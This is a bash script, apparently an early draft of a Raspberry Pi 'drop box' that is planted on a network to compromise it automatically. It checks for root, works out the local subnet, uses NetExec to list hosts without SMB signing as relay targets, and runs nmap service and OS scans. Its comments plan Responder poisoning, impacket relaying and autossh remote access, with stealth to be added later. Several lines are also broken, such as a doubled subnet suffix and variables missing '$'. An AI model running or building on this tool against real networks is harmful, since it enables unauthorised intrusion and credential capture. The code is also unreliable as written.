#!/bin/bash
# This is a script that can be droipped into a Raspberry pi like a dropbox
#It will attempt to auto-pwn the network.... be warned, it is meant to be a little noisy and aggressive.
#Future iterations will be more stealthy, but for now, function > stealth

#Hardware for LTE
#Not required, but really helpful in case things don't work as planned

#https://docs.sixfab.com/docs/getting-started-with-base-hat-and-quectel-ec25-eg25-module




#This requires several services - in the future I'd like to add them to a "sigle script" to install
#In future iterations, I will do more error checking and gracefully making sure the rigfht folders/packages/etc are all installed
#For now, we are just going to assume they are (nmap, autossh, impacket, etc)
#NOTE - inotifywait is an important package here that is not on kali by default. Make sure you have it!


#First, check if running as root
if [ "$EUID" -ne 0 ]
  then echo -e 'Please run me as root.\n Do NOT pass go.\n Do NOT collect \$200'
  exit
fi

#First, we are going to fire up responder
#scratch that - first we are going to identify computers with SMB signing disabled. Otherwise, Responder doesn't help much
#Third time is the charm. First, we find our IP and subnet info, THEN we find unsigned SMB, THEN we run responder, THEN WE FIRE THE MISSILES!!

prolly_the_right_IP=$(ip addr show eth0 | awk '/inet /{print $2; exit}' | cut -d/ -f1)
echo -e "Your IP is $prolly_the_right_IP"
wut_subnet=$(echo $prolly_the_right_IP | cut -f 1,2,3 -d ".").0/24
echo "wut_subnet"
echo -e "Your subnet is $wut_subnet. Pwning will commence in 3....2....1...."
nxc smb ${wut_subnet}.0/24 --gen-relay-list relay_list.txt


nmap wut_subnet -sV -O
